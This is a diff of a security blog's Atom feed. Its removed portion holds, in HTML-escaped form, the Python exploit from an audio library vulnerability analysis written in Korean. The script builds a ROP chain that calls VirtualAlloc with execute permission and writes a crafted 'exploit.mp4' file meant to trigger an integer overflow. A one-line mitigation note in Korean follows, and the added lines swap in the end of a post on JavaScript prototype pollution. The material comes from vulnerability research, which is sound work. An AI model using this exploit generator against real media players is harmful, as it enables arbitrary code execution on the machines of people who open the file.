-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov_eax_ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;            
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;virtual_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_ecx_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppppr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# size
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# execution
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;sub_eax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_eax_20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;sub_eax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x90\x90\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_eax&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jmp_eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x08&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x74\x79\x70&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# file signature
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;#  0x10 &amp;gt; 0x11   break pass
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x69\x6C\x73\x74&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ilst
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\xAf\xff&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# 1 read size
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6E\x61\x6D\x65&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# name
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x90\x90\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# dummy 
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rop_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_esp_13c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13c&lt;/span&gt; 
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;rop_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_esp_13c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rop_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rop_chain&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 23c
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xAff3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rop_space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rop_space&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;data_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xff\x72\xeb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;data_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x64\x61\x74\x61&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x90\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_esp_13c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfd0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;exploit.mp4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; 
-
-&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;대응방안&quot;&gt;대응방안&lt;/h3&gt;
-
-&lt;p&gt;integer overflow가 발생하지 않게 연산할때 오버플로우를 검증 하는코드를 추가 합니다.&lt;/p&gt;</content><author><name>이해찬</name></author><category term="R&amp;D" /><summary type="html">Audio Library vulnerability analysis</summary></entry></feed>
+&lt;p&gt;special thx to @munsiwoo&lt;/p&gt;</content><author><name>윤석찬</name></author><category term="R&amp;D" /><summary type="html">Javascript Prototype Pollution in REALWORD</summary></entry></feed>
